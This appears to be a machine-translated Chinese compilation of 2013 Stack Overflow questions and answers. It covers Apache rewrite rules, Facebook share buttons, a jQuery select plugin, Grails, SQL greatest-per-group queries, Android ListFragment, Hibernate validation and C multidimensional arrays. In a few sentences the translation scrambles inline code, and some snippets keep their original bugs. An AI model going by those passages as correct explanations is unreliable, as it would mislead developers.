所以 SelectedIndices 是一个包含所有选定单元格的集合：) ListView.SelectedIndices[0] 为您提供当前选定的行。但是注意！您必须检查 ListView.SelectedIndices[0] > 0 ！

# mod-rewrite - .htaccess 和 Rewriterules，更改一些 URL

> ID：14111176
> 
> 赞同：0
> 
> 时间：2013-01-01T14:11:16.347
> 
> 标签：mod-rewrite

我不知道这是否可能，我希望我的网站的 URL 看起来像：

```
site.com/browse/2-title/page/2 
```

而他们实际上是：

```
site.com/index.php?action=browse&id=2&title=title&page=2 
```

你知道如何在重写规则中做到这一点吗？这甚至可能吗？

谢谢你们，我真的很感谢这里的一些帮助:)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-01T14:25:20.547

会是这样的：

```
RewriteEngine on
RewriteBase /
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteCond %{REQUEST_URI} /([^/]+)/([^/]+)-([^/]+)/([^/]+)/([^/]+)
RewriteRule .* http://site.com/index.php?action=%1&id=%2&title=%3&%4=%5 [L] 
```

它会默默地映射一个像这样的 URL：

`site.com/browse/2-title/page/2`

至：

`http://site.com/index.php?action=browse&id=2&title=title&page=2`

传入 URL中的 、 、 和`browse`是`2`传递`title`给映射资源的变量。`page``2`

# html - 同一页面中有许多 FACEBOOK SHARE 按钮？

> ID：14111177
> 
> 赞同：4
> 
> 时间：2013-01-01T14:11:26.690
> 
> 标签：html, django, facebook, share, facebook-like

我使用 javascript 在我的页面中实现了 facebook 分享按钮，如下所示：

```
<script type="text/javascript">
$(document).ready(function(){
        $('#share_button').click(function(e){
            e.preventDefault(); 
            FB.ui(
            {
                method: 'feed',
                name: "{{ user_name }}'s FOF",
                link: "https://www.example.com/uploader/{{current_fof}}/share_fof/",
                picture: imgsArray[0].src,
                caption: window.location.href,
                description: 'This FOF was taken by {{ user_name }}',
                message: ''
            });     
        });
    });
</script>

<div class="share"> <img src = "{{ STATIC_URL }}images/share_facebook.png" id="share_button" type='button_count'></div> 
```

它工作得很好，但现在我想在同一页面中放置许多帖子，并为每个帖子使用不同的分享按钮（非常 FB 分享按钮应该有**不同的链接、标题和图像）**。有任何想法吗？

它与like按钮一起使用，使用FB API：

```
<div class="fb-like" data-href="https://www.example.com/uploader/{{current_fof}}/share_fof/" data-send="true" data-layout="button_count" data-width="450" data-show-faces="false" data-font="arial"></div> 
```

但是如何用 share_button 做类似的事情呢？任何的想法？

干杯，

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-01T14:20:46.667

给每个“分享”按钮一个不同的 ID 并更改每个项目的其他选项（不同的链接、标题和图像）。
例如：

```
<script type="text/javascript">
$(document).ready(function(){
        $('#share_button1').click(function(e){
            e.preventDefault(); 
            FB.ui(
            {
                method: 'feed',
                name: "{{ user_name }}'s FOF",
                link: "https://mysite.com/uploader/{{current_fof}}/share_fof/",
                picture: imgsArray[0].src,
                caption: window.location.href,
                description: 'This FOF was taken by {{ user_name }}',
                message: ''
            });     
        });
        $('#share_button2').click(function(e){
            e.preventDefault(); 
            FB.ui(
            {
                method: 'feed',
                name: "{{ user_name }}'s FOF",
                link: "https://mysite.com/uploader/{{current_fof}}/share_fof/",
                picture: imgsArray[0].src,
                caption: window.location.href,
                description: 'This FOF was taken by {{ user_name }}',
                message: ''
            });     
        });          
        $('#share_button3').click(function(e){
            e.preventDefault(); 
            FB.ui(
            {
                method: 'feed',
                name: "{{ user_name }}'s FOF",
                link: "https://mysite.com/uploader/{{current_fof}}/share_fof/",
                picture: imgsArray[0].src,
                caption: window.location.href,
                description: 'This FOF was taken by {{ user_name }}',
                message: ''
            });     
        });
});
</script> 
```

按钮可能是：

```
<div class="share"> <img src = "{{ STATIC_URL }}images/share_facebook.png" id="share_button1" type='button_count'></div>  
<div class="share"> <img src = "{{ STATIC_URL }}images/share_facebook.png" id="share_button2" type='button_count'></div>  
<div class="share"> <img src = "{{ STATIC_URL }}images/share_facebook.png" id="share_button3" type='button_count'></div> 
```

# jquery - jQuery 下拉列表（选择框）只显示下面的列表

> ID：14111178
> 
> 赞同：0
> 
> 时间：2013-01-01T14:11:28.407
> 
> 标签：jquery, jquery-plugins, javascript

我使用这个 jQuery 插件：[http ://www.myjqueryplugins.com/jquery-plugin/selectyze](http://www.myjqueryplugins.com/jquery-plugin/selectyze)

我注意到下拉列表仅在选择框下方展开，当在页面底部打开列表时，使列表转到“外部”浏览器窗口。如果下面的空间很小，您可能知道选择框上方的标准选择框扩展，这可能以某种方式使用此脚本吗？

**插件脚本**

```
$(document).ready(function(){
    // simple Selectyze call
    $(".selectyze").Selectyze();
    // call with options
    $(".selectyze").Selectyze({
        theme:'css3',
        effectOpen:'fade',
        effectClose:'slide'
    });
}); 
```

**jQuery**

```
/************************************************************************
*************************************************************************
@Name :         Selectyze - jQuery Plugin
@Revison :      1.1
@Date :         25/01/2011
@Author:        Mickael SURREL - ALPIXEL Agency - (www.myjqueryplugins.com - www.alpixel.fr) 
@License :      Open Source - MIT License : http://www.opensource.org/licenses/mit-license.php

**************************************************************************
*************************************************************************/
(function($) {
$.fn.Selectyze = function(opt) {
    var defaults = {
        theme:'css3',
        effectOpen : 'slide',
        effectClose : 'slide'
    }; 

    if(this.length)
    return this.each(function() {

        /** vars **/
        var 
            opts = $.extend(defaults, opt),
            $this = $(this),
            optionselected = $this.find('option').filter(':selected'),
            DivSelect = $('<div>', {'class' : 'DivSelectyze '+opts.theme+''}),
            UlSelect = $('<ul>',{'class':'UlSelectize'}),
            liHtml = '';

        zIndex = 9999;

        /** DOM construction && manipulation **/
        constructList($this);
        $this.hide();
        $this.after(DivSelect);
        DivSelect.html('<a href="#" rel="'+optionselected.val()+'" class="selectyzeValue">'+optionselected.text()+'</a>');

        UlSelect.appendTo(DivSelect).html(liHtml);
        $('.DivSelectyze').each(function(i,el){
            $(this).css('z-index',zIndex);
            zIndex -= 10;
        });

        /** Actions **/
        n=false;
        DivSelect.mouseenter(function() {n =false;}).mouseleave(function() {n = true;});

        DivSelect.find('a.selectyzeValue').click(function(e){
            e.preventDefault();
            closeList($('ul.UlSelectize').not($(this).next()));
            openList($(this).next('ul.UlSelectize'));
        });

        UlSelect.find('a').click(function(e){
            e.preventDefault();
            DivSelect.find('a.selectyzeValue').text($(this).text());
            $this.val($(this).attr('rel'));           
            $this.trigger('change');         
            closeList($this.next().find('.UlSelectize'));
        });

        $(document).click(function(e){if(n) closeList($('.UlSelectize').not(':hidden'));});

        /** Construct HTML list ul/li **/
        function constructList(el){
            /** Creat list content **/
            if(el.has('optgroup').length)
            {
                el.find('optgroup').each(function(i,el){
                    liHtml += '<li><span class="optgroupTitle">'+$(this).attr('label')+'</span><ul>';
                    $(this).children().each(function(i,el){
                        liHtml += '<li><a rel="'+$(this).val()+'" href="#">'+$(this).text()+'</a></li>';
                    });
                    liHtml += '</ul></li>';
                });
            }
            else
            {
                el.find('option').each(function(i,el){
                    liHtml += '<li><a rel="'+$(this).val()+'" href="#">'+$(this).text()+'</a></li>';
                });
            }
        }

        /** Effect Open list **/
        function openList(el) {
            switch (opts.effectOpen) {
                case 'slide' :
                    if(!el.is(':hidden')) el.stop(true,true).slideUp('fast');   
                    else el.stop(true,true).slideDown('fast');  
                break;
                case 'fade':
                    if(!el.is(':hidden')) el.stop(true,true).fadeOut('fast');   
                    else el.stop(true,true).fadeIn('fast'); 
                break;
                default :
                    if(!el.is(':hidden')) el.stop(true,true).hide();    
                    else el.stop(true,true).show(); 
            }
        }

        /** Effect Close list **/
        function closeList(el) {
            switch (opts.effectClose) {
                case 'slide' :
                    el.stop(true,true).slideUp('fast');
                break;
                case 'fade':
                    el.stop(true,true).fadeOut('fast');
                break;
                default :
                    el.hide();  
            }
        }

    });
}
})(jQuery); 
```

**CSS**

```
/************************************************************************
*************************************************************************
@Name :         Selectyze - jQuery Plugin CSS
@Revison :      1.0
@Date :         19/12/2011
@Author:        Mickael SURREL - ALPIXEL Agency - (www.myjqueryplugins.com - www.alpixel.fr) 
@License :       Open Source - MIT License : http://www.opensource.org/licenses/mit-license.php

**************************************************************************
*************************************************************************/

/***************************/
/** Common to every theme **/
/***************************/
.DivSelectyze {
    position:relative;
    width:253px;
    float:left;
    margin-top:15px;
}

.DivSelectyze .selectyzeValue {
    position:relative;
    z-index:10;
    display:block;
    text-decoration:none;
}

.DivSelectyze ul {list-style:none;}
.DivSelectyze .UlSelectize {
    position:absolute;
    z-index:9999;
    display:none;
}

.DivSelectyze li a {
    display:block;
    text-decoration:none;
}

.optgroupTitle {
    display:block;
}
/*******************************/
/** END COMMON TO EVERY THEME **/
/*******************************/
/*++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*/

/*----------------------------------
 You can add your own theme below !!
 To add your theme, be sure to have 5 CSS elements :

 .your_theme .selectyzeValue {}         -> Appearance of your select element
 .your_theme .UlSelectize {}            -> Appearance of the dropdown list
 .your_theme li a {}                    -> Appearance of the items into the dropdown list
 .your_theme li a:hover {}              -> items on hover
 .your_theme .optgroupTitle {}          -> Appearance of the optgroup label !! only if you have <optgroup> element into your list 

 that's all ! \o/
----------------------------------*/

    /*****************/
    /** SKYPE THEME **/
    /*****************/
    .skype .selectyzeValue {
        font:18px/45px Arial;
        color:#2a98c1;
        width:254px;
        height:45px;
        background:url('bg_skype.png') no-repeat;
        padding-left:15px
    }

    .skype .UlSelectize {
        top:39px;
        left:6px;
        width:239px;
        border:1px solid #00aff0;
        background-color:#f7f8ff
    }

    .skype li a {
        height:28px;
        font:14px/30px Arial;
        background-color:transparent;
        color:#2a98c1;
        border-top:1px solid #84d8f8;
        padding-left:10px
    }

    .skype li a:hover {
        color:#fff;
        background-color:#2a98c1;/** gradient bgcolors */
        background-image: -webkit-gradient(linear, left top, left bottom, from(#84d8f8), to(#0ab2f1)); /* Saf4+, Chrome */
        background-image: -webkit-linear-gradient(top, #84d8f8, #0ab2f1); /* Chrome 10+, Saf5.1+, iOS 5+ */
        background-image:    -moz-linear-gradient(top, #84d8f8, #0ab2f1); /* FF3.6 */
        background-image:     -ms-linear-gradient(top, #84d8f8, #0ab2f1); /* IE10 */
        background-image:      -o-linear-gradient(top, #84d8f8, #0ab2f1); /* Opera 11.10+ */
        background-image:         linear-gradient(top, #84d8f8, #0ab2f1)
    }

    .skype .optgroupTitle {
        margin-top:15px;
        font-size:16px;
        padding-left:10px;
        background-color:#0fb1ef;
        color:#fff;
    } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-03T22:34:32.420

我不知道这个插件是如何工作的。但是我使用这个可定制的是面向对象的。 [http://des.deletesoft.com:8080/?go=7](http://des.delestesoft.com:8080/?go=7)

# grails - 使用布尔值捕获用户列表，spring security

> ID：14111187
> 
> 赞同：1
> 
> 时间：2013-01-01T14:12:54.717
> 
> 标签：grails, groovy, spring-security, boolean, scaffolding

所以我已经对此进行了一段时间的调查，但我不确定我的方法是否真的可行。我对 groovy 很陌生，而且真的很挣扎。

我正在编写一个网络应用程序，可用于监控 IT 项目的时间使用情况。我正在编写我的项目类，它将保存有关每个项目的信息，并且我希望能够将单个用户关联到项目，为每个用户在脚手架 gsp 页面上制作复选框。因此，我想为每个用户针对每个项目创建一个布尔值。

我一直在尝试在我的域类中使用 .each() 命令来实现这一点。如下。任何人的任何帮助都会非常感激，我不能开始说。

```
package timetracker2

import java.util.Date;
import grails.timesecurity.*

class Project {

  String name
  int pmgNumber
  Projectmanagers fullName
  String description
  Date estimatedCompletionDate
  String estimatedDuration
  Date dateCreated
  Map attachedUsers 

  def Person.each() {
      String username = Person.username
      attachedUsers = [username:Boolean.valueOf()]
  }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-01T16:58:11.790

使用[多对多](http://grails.org/doc/latest/guide/GORM.html#manyToMany)关系。

```
class Project {
    static hasMany = [persons: Person]
...
}

class Person {
    static hasMany = [projects: Project]
...
}

// get persons affiliated with a project:
project.persons

// get a person's projects:
person.projects 
```

然后，在您的视图中，您可以显示所有项目的列表，其中选定的项目也在 person.projects 中。

# sql - SQL 分组选择

> ID：14111189
> 
> 赞同：10
> 
> 时间：2013-01-01T14:12:56.353
> 
> 标签：sql, sql-server, tsql

我正在使用 SQL Server，并且我有一个包含以下列的表：

```
SessionId | Date | first name | last name 
```

我想做`group by sessionId`然后得到最大日期的行。

例如：

```
xxx | 21/12/2012 | f1 | l1
xxx | 20/12/2012 | f2 | l2
yyy | 21/12/2012 | f3 | l3
yyy | 20/12/2012 | f4 | l4 
```

我想得到以下行：

```
xxx | 21/12/2012 | f1 | l1
yyy | 21/12/2012 | f3 | l3 
```

谢谢

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-01-01T14:18:22.040

尝试这个：

```
WITH MAXSessions
AS
(
  SELECT 
    *,
    ROW_NUMBER() OVER(PARTITION BY SessionID ORDER BY Date DESC) rownum
  FROM Sessions
)
SELECT
  SessionId,
  Date,
  firstname,
  lastname 
FROM MAXSessions
WHERE rownum = 1; 
```

**或者：**

```
SELECT 
  s.SessionId,
  s.Date,
  s.firstname,
  s.lastname 
FROM Sessions s
INNER JOIN
(
   SELECT SessionID, MAX(Date) LatestDate
   FROM sessions
   GROUP BY SessionID
) MAxs  ON maxs.SessionID  = s.SessionID
       AND maxs.LatestDate = s.Date; 
```

* * *

**更新：**要获取会话数，您可以执行以下操作：

```
SELECT 
  s.SessionId,
  s.Date,
  s.firstname,
  s.lastname,
  maxs.SessionsCount
FROM Sessions s
INNER JOIN
(
   SELECT SessionID, COUNT(SessionID), SessionsCount, MAX(Date) LatestDate
   FROM sessions
   GROUP BY SessionID
) MAxs  ON maxs.SessionID  = s.SessionID
       AND maxs.LatestDate = s.Date; 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-01-01T14:44:53.600

这是 Mahmoud 回答的一个活生生的例子 - [**SQL Fiddle**](http://sqlfiddle.com/#!3/710bc/3)

这里也是一样的，只是使用了一个子查询：

```
SELECT a.*
FROM 
    #Table a
    INNER JOIN
        (
        SELECT 
            SessionID,
            [mx] = MAX([Date])      
        FROM #Table
        GROUP BY SessionID                  
        ) b
        ON
            a.[SessionId ] = b.SessionID AND
            a.[Date] = b.mx; 
```

[**这是上述子查询版本的 SQL FDDLE**](http://sqlfiddle.com/#!3/710bc/5)

您也可以使用`EXISTS`- 这是我最喜欢的：

```
SELECT 
     a.*,
     c.CNT 
FROM 
     #Table a
     INNER JOIN 
        ( --to return a count of sessionIds
        SELECT 
           SessionID,
           [CNT] = COUNT(*)     
        FROM #Table
        GROUP BY SessionID                  
        ) c
          ON a.SessionID = c.SessionID
WHERE 
    EXISTS
        (
        SELECT 1
        FROM #Table b
        WHERE
            a.[SessionId] = b.SessionID AND
            a.[Date] > b.[Date] 
        ) 
```

[**这是包含附加计数的 SQL FDDLE**](http://sqlfiddle.com/#!3/710bc/7)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-01T14:18:05.563

有几个选项，一个是使用按日期对行进行排名的[CTE](http://msdn.microsoft.com/en-us/library/ms175972.aspx)：

**编辑以包括会话计数**

```
WITH Sessions AS (
    SELECT SessionId, [Date], FirstName, LastName,
    ROW_NUMBER() OVER (PARTITION BY SessionId ORDER BY [Date] DESC) AS Ord
    FROM YourTable
)
SELECT S.SessionId, S.Date, S.FirstName, S.LastName, X.SessionCount
FROM Sessions S
INNER JOIN (
    SELECT SessionId, COUNT(*) AS SessionCount
    FROM Sessions
    GROUP BY SessionId 
) X ON X.SessionId = S.SessionId  
WHERE S.Ord = 1 
```

[在这种情况下，排名函数](http://msdn.microsoft.com/en-us/library/ms189798.aspx)是您的朋友，您想要获取满足某些“有序”标准的整行，例如最大日期。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-01-01T14:54:07.687

来吧，简单的就行了

```
select a.date1,a.first_name,a.last_name
from(select row_number() 
over(partition by SessionId order by SessionId) rnk,date1,first_name,last_name
from table1) a where a.rnk=1 
```

[**SQL_FIDDLE_DEMO**](http://www.sqlfiddle.com/#!3/b1187/7)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-01-01T17:22:58.183

```
 SELECT b.sessionid, 
       b.date, 
       b.fristname,         b.lastname 
FROM   (SELECT t2.sessionid, 
               Max(t2.date) AS Date 
        FROM   temp1 t2 
        GROUP  BY t2.sessionid) a, 
       temp1 b 
WHERE  a.sessionid = b.sessionid 
       AND a.date = b.date 
```

找到结果的最佳方法是

# java - 在片段中使用 ListView

> ID：14111196
> 
> 赞同：0
> 
> 时间：2013-01-01T14:14:03.327
> 
> 标签：java, android, android-fragments

1-我想使用 ListFragment。

2 - 我的类从 Activity 扩展而不是 ListActivity（因为我想在 ListView 的顶部有一个 TextView）。因此，这是主要布局：

```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:orientation="vertical" >

    <TextView
            android:id="@+id/txt"
            android:layout_width="fill_parent"
            android:layout_height="40sp" />

    <ListView
        xmlns:android="http://schemas.android.com/apk/res/android"
        android:id="@+id/listView"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content" />

</LinearLayout> 
```

这是我的代码：

```
public class List1 extends SherlockListFragment {

    private ArrayList<String> list = new ArrayList<String>();

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        System.out.println("onCreate............");

        for(int i=0; i<30; i++)
            list.add("item " + i);
    }

    @Override
    public View onCreateView(LayoutInflater inflater, ViewGroup container, Bundle savedInstanceState) {
        System.out.println("onCreateView.................");

        View view = inflater.inflate(R.layout.main_list1, container, false);

        TextView label = (TextView) view.findViewById(R.id.txt);
        label.setText("Hello");

        ListView lv = (ListView) view.findViewById(R.id.listView);
          lv.setAdapter(new MultiAdapter(view.getContext()));

        return view;
    }

    @Override 
    public void onActivityCreated(Bundle savedInstanceState) {
        super.onActivityCreated(savedInstanceState);
        System.out.println("onActivityCreated..........");

    }

    private class MultiAdapter extends ArrayAdapter<String> {

        public MultiAdapter(Context context) {
            super(context, R.layout.list1, list);
        }

        @Override
        // Called when updating the ListView
        public View getView(int position, View convertView, ViewGroup parent) {

            View row;

            if (convertView == null)  {
                LayoutInflater inflater = getActivity().getLayoutInflater();
                row = inflater.inflate(R.layout.list1, parent, false);
            } else
                row = convertView;

            TextView txt = (TextView) row.findViewById(R.id.label);
            txt.setText(list.get(position));    

            return row;
        }
    } 
```

当我使用 Tab 转到此 Fragment 时，应用程序崩溃了。这是我在日志中得到的例外：

```
01-01 14:59:51.154: E/AndroidRuntime(20091): FATAL EXCEPTION: main
01-01 14:59:51.154: E/AndroidRuntime(20091): java.lang.RuntimeException: Your content must have a ListView whose id attribute is 'android.R.id.list'
01-01 14:59:51.154: E/AndroidRuntime(20091):    at android.support.v4.app.ListFragment.ensureList(ListFragment.java:344)
01-01 14:59:51.154: E/AndroidRuntime(20091):    at android.support.v4.app.ListFragment.onViewCreated(ListFragment.java:145)
01-01 14:59:51.154: E/AndroidRuntime(20091):    at android.support.v4.app.FragmentManagerImpl.moveToState(FragmentManager.java:884)
01-01 14:59:51.154: E/AndroidRuntime(20091):    at android.support.v4.app.FragmentManagerImpl.moveToState(FragmentManager.java:1080)
01-01 14:59:51.154: E/AndroidRuntime(20091):    at android.support.v4.app.BackStackRecord.run(BackStackRecord.java:622)
01-01 14:59:51.154: E/AndroidRuntime(20091):    at android.support.v4.app.FragmentManagerImpl.execPendingActions(FragmentManager.java:1416)
01-01 14:59:51.154: E/AndroidRuntime(20091):    at android.support.v4.app.FragmentManagerImpl.executePendingTransactions(FragmentManager.java:431)
01-01 14:59:51.154: E/AndroidRuntime(20091):    at com.example.tabtest.FragmentTab$TabManager.onTabChanged(FragmentTab.java:134)
01-01 14:59:51.154: E/AndroidRuntime(20091):    at android.widget.TabHost.invokeOnTabChangeListener(TabHost.java:359)
01-01 14:59:51.154: E/AndroidRuntime(20091):    at android.widget.TabHost.setCurrentTab(TabHost.java:344)
01-01 14:59:51.154: E/AndroidRuntime(20091):    at android.widget.TabHost$2.onTabSelectionChanged(TabHost.java:132)
01-01 14:59:51.154: E/AndroidRuntime(20091):    at android.widget.TabWidget$TabClickListener.onClick(TabWidget.java:458)
01-01 14:59:51.154: E/AndroidRuntime(20091):    at android.view.View.performClick(View.java:2533)
01-01 14:59:51.154: E/AndroidRuntime(20091):    at android.view.View$PerformClick.run(View.java:9320)
01-01 14:59:51.154: E/AndroidRuntime(20091):    at android.os.Handler.handleCallback(Handler.java:587)
01-01 14:59:51.154: E/AndroidRuntime(20091):    at android.os.Handler.dispatchMessage(Handler.java:92)
01-01 14:59:51.154: E/AndroidRuntime(20091):    at android.os.Looper.loop(Looper.java:150)
01-01 14:59:51.154: E/AndroidRuntime(20091):    at android.app.ActivityThread.main(ActivityThread.java:4385)
01-01 14:59:51.154: E/AndroidRuntime(20091):    at java.lang.reflect.Method.invokeNative(Native Method)
01-01 14:59:51.154: E/AndroidRuntime(20091):    at java.lang.reflect.Method.invoke(Method.java:507)
01-01 14:59:51.154: E/AndroidRuntime(20091):    at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:849)
01-01 14:59:51.154: E/AndroidRuntime(20091):    at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:607)
01-01 14:59:51.154: E/AndroidRuntime(20091):    at dalvik.system.NativeStart.main(Native Method) 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-01T14:20:48.283

您的片段布局必须有一个`ListView`带有 id: 的`android.R.id.list`，否则 android 将不知道要使用哪个 ListView。

像这样：

```
<ListView
    xmlns:android="http://schemas.android.com/apk/res/android"
    android:id="@android:id/list"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content" /> 
```

注意`android:id="@android:id/list"`.

# spring - Hibernate 验证器 URL 和 ConstraintViolationException

> ID：14111197
> 
> 赞同：0
> 
> 时间：2013-01-01T14:14:03.947
> 
> 标签：spring, hibernate, validation, nhibernate-validator, url-validation

我正在使用 Hibernate 验证器 4.3。我尝试验证给定的实体：

```
@Entity
@Table(name = "standard_group")
    public class StandardGroup extends AbstractEntity {

    private static final long serialVersionUID = 1985481354L;
    private Long id;
    private String groupName;
    private String commissionDecisionFileUrl;
    private String urlTitle;

    @Id
    @GeneratedValue
    public Long getId() {
        return id;
    }
    public void setId(Long id) {
        this.id = id;
    }

    @NotEmpty(message = "custom error text")
    @Column(name = "grup_name")
    public String getGroupName() {
        return groupName;
    }

    public void setGroupName(String groupName) {
        this.groupName = groupName;
    }

    @URL(message = "custom error text") 
    @Column(name = "comission_decision_file_url")
    public String getCommissionDecisionUrl() {
        return commissionDecisionFileUrl;
    }

    public void setCommissionDecisionUrl(String commissionDecisionUrl) {
        this.commissionDecisionFileUrl = commissionDecisionUrl;
    }

    @Column(name = "url_title", length = 25)
    @Length(max = 25, message = "custom error text")
    public String getUrlTitle() {
        return urlTitle;
    }

    public void setUrlTitle(String urlTitle) {
        this.urlTitle = urlTitle;
    } 
```

但是我在 web 表单中遇到问题，当**commissionDecisionFileUrl**为空并且**urlTitle**被填充时，然后得到异常（否则验证过程可以正常工作）：

```
javax.validation.ConstraintViolationException: Validation failed for classes [sk.peterjurkovic.cpr.entities.StandardGroup] during update time for groups [javax.validation.groups.Default, ]
List of constraint violations:[
    ConstraintViolationImpl{interpolatedMessage='Odkaz na soubor ma chybný tvar', propertyPath=commissionDecisionUrl, rootBeanClass=class sk.peterjurkovic.cpr.entities.StandardGroup, messageTemplate='Odkaz na soubor ma chybný tvar'}
]
    org.hibernate.cfg.beanvalidation.BeanValidationEventListener.validate(BeanValidationEventListener.java:159)
    org.hibernate.cfg.beanvalidation.BeanValidationEventListener.onPreUpdate(BeanValidationEventListener.java:102)
    org.hibernate.action.internal.EntityUpdateAction.preUpdate(EntityUpdateAction.java:235)
    org.hibernate.action.internal.EntityUpdateAction.execute(EntityUpdateAction.java:115)
    org.hibernate.engine.spi.ActionQueue.execute(ActionQueue.java:362)
    org.hibernate.engine.spi.ActionQueue.executeActions(ActionQueue.java:354)
    org.hibernate.engine.spi.ActionQueue.executeActions(ActionQueue.java:276)
    org.hibernate.event.internal.AbstractFlushingEventListener.performExecutions(AbstractFlushingEventListener.java:326)
    org.hibernate.event.internal.DefaultFlushEventListener.onFlush(DefaultFlushEventListener.java:52)
    org.hibernate.internal.SessionImpl.flush(SessionImpl.java:1213) 
```

谢谢你的帮助。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-01T20:13:44.663

根据所提供的信息，很难确定。我建议您设置一个断点`org.hibernate.validator.constraints.impl.URLValidator.isValid(String, ConstraintValidatorContext)`并自己查看输入无效的原因。

# php - 在 apache 中实现文件名版本的最佳方法

> ID：14111201
> 
> 赞同：0
> 
> 时间：2013-01-01T14:14:32.953
> 
> 标签：php, html, apache, proxy, browser-cache

我读到最好将我的文件命名为“test.v01.css”而不是“test.css?v=01”，因为一些代理忽略了 CGI 参数部分。

问题是：

最简单的方法是什么？（对于所有以“.js”和“.css”结尾的文件）

我正在使用 PHP 和 Apache。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-01T14:19:47.670

.ht 访问：

```
RewriteEngine on
RewriteCond %{REQUEST_FILENAME} !-s # Make the file doesn't actually exist
RewriteRule ^(.*)\.[\d]+\.(css|js)$ $1.$2 [L] # Strip out the version number 
```

php:

```
function versioning($file)
{
  if(strpos($file, '/') !== 0 || !file_exists($_SERVER['DOCUMENT_ROOT'] . $file))
    return $file;

  $mtime = filemtime($_SERVER['DOCUMENT_ROOT'] . $file);
  return preg_replace('{\\.([^./]+)$}', ".$mtime.\$1", $file);
} 
```

用法：

```
<link rel="stylesheet" href="<?=versioning('/stylesheet/base.css')?>" type="text/css" /> 
```

结果：

```
<link rel="stylesheet" href="/stylesheet/base.94857365432.css" type="text/css" /> 
```

# html - 如何使用模板删除边线

> ID：14111209
> 
> 赞同：0
> 
> 时间：2013-01-01T14:15:56.223
> 
> 标签：html, templates, border

在我的网站上，我想删除整个网站周围的标准边框，使用这个 CSS 我设法做到了：

```
body {
    margin: 0; 
} 
```

问题是，在我的索引页面中，它不使用模板，这工作得非常好，但在我所有其他页面中，我使用了一个模板，它确实引用了与索引相同的 CSS Stylesheed 文件，但奇怪的是它没有在那里工作，边界还在。有人知道如何解决这个问题吗？

这是我的意思的一些图片： ![http://i.imgur.com/bJTFF.png](../Images/15a5491550d83055e9999b2b943d3836.png)

# c - C语言中当二维数组和多维数组作为函数参数时

> ID：14111210
> 
> 赞同：1
> 
> 时间：2013-01-01T14:16:00.373
> 
> 标签：c, multidimensional-array

> **可能重复：**
> [如何在 C++ 中使用数组？](https://stackoverflow.com/questions/4810664/how-do-i-use-arrays-in-c)

一维数组作为函数参数：

```
#include <stdio.h>
#include <string.h>

int func(int a[], int n)
{
    int i;
    for(i = 0; i < n; i++)
        printf("%d ", a[i][j]);
}

int main(void)
{   
    int a[2] = {1,2};
    func(a, 2);
} 
```

它编译并正确运行。

但是当二维数组作为函数参数时：

```
#include <stdio.h>
#include <string.h>

int func(int a[][], int n)
{
    int i, j;
    for(i = 0; i < n; i++)
        for(j = 0 ; j < n; j++)
            printf("%d ", a[i][j]);
        printf("\n");
}

int main(void)
{   
    int a[2][2] = {{1,2}, {3,4}};
    func(a, 2);
} 
```

它无法正确编译。我必须像这样修改代码：

```
#include <stdio.h>
#include <string.h>

int func(int a[][2], int n)
{
    int i, j;
    for(i = 0; i < n; i++)
        for(j = 0 ; j < n; j++)
            printf("%d ", a[i][j]);
        printf("\n");
}

int main(void)
{   
    int a[2][2] = {{1,2}, {3,4}};
    func(a, 2);
} 
```

我不知道为什么？任何人都可以解释它是如何工作的？非常感谢。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-01-01T14:26:40.743

c 中的数组（一维和多维）驻留在连续的内存块中。这意味着当您定义 时`char a[3]`，数组在内存中的布局是这样的（原谅我糟糕的 ascii 艺术技能）：

```
| a[0] | a[1] | a[2] | 
```

对于二维数组`char a[2][3]`，布局如下：

```
| a[0][0] | a[0][1] | a[0][2] | a[1][0] | a[1][1] | a[1][2] |  
                              ^
                              +--- first row ends here 
```

因此，当您索引二维数组`a[i][j]`时，编译器会生成与此等效的代码：

```
*(a + i*3 + j) 
```

可以读作“跳过 i 行并在该行中取单元格 j”。为此，编译器必须知道行的长度（即第二维）。这意味着第二维是类型定义的一部分！

因此，当您想要将二维数组传递给函数时，您必须为类型定义指定所需的维度。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-01-01T14:22:21.310

最近的（例如[C2011](http://en.wikipedia.org/wiki/C11_%28C_standard_revision%29)，可能还有[C99](http://en.wikipedia.org/wiki/C99)）*C*标准启用了[可变长度数组](http://en.wikipedia.org/wiki/Variable-length_array)，因此以下函数确实有效

```
int
sum (int n, int t[n][n])
{
  int s = 0;
  for (int i = 0; i < n; i++)
    for (int j = 0; j < n; j++)
      s += t[i][j];
  return s;
} 
```

^(这是在没有警告的情况下编译的，`gcc-4.7 -std=gnu99 -Wall -O -c ex.c`并且生成的汇编程序是您所期望的)

至于为什么`int t[][]`不能工作，那是因为整体的每个元素都是大小不定`t`的类型。`int []`

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-01T14:21:37.707

这是一个很好的解释：http: [//www.eskimo.com/~scs/cclass/int/sx9a.html](http://www.eskimo.com/~scs/cclass/int/sx9a.html)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-01-01T14:21:41.567

如果没有数组的第二维，编译器不知道如何索引它。这是因为编译器使用指针进行了一些算术运算，以找出在内存中找到值的位置。

* * *

## 回答 #5

> 赞同：0
> 
